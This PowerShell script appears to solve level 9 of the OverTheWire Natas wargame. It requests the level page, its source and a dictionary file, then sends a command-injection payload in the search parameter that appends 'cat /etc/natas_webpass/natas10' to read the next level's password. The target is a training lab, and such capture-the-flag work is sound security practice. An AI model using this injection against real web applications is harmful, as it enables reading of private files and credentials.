
$currentLevel = 9
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest "$currentURL" -Credential $credential -SessionVariable session
$page.RawContent

$currentLevel = 9
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest "$currentURL/index-source.html" -Credential $credential -SessionVariable session
$page.content

$currentLevel = 9
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest "$currentURL/dictionary.txt" -Credential $credential -SessionVariable session
$page.RawContent

$currentLevel = 9
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest "$currentURL/?needle=n%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search" -Credential $credential -SessionVariable session
$page.RawContent


